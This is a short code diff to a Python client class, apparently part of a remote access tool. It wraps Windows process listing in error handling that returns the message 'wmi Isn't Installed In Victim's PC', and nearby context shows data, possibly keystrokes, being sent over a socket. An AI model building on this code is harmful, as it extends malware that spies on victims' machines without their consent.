@@ -79,12 +79,15 @@ class Client():
         self.client.send(str(key).encode())
     def get_running_process(self) -> str:
         if sys.platform=="win32":
-            import wmi
-            w=wmi.WMI()
-            ps=""
-            for i in w.Win32_Process():
-                ps+=f"{i.Name}\t\t{i.ProcessId}\n"
-            return ps
+            try:
+                import wmi
+                w=wmi.WMI()
+                ps=""
+                for i in w.Win32_Process():
+                    ps+=f"{i.Name}\t\t{i.ProcessId}\n"
+                return ps
+            except:
+                return "wmi Isn't Installed In Victim's PC"
         else:
             return subprocess.getoutput("ps")
     @staticmethod
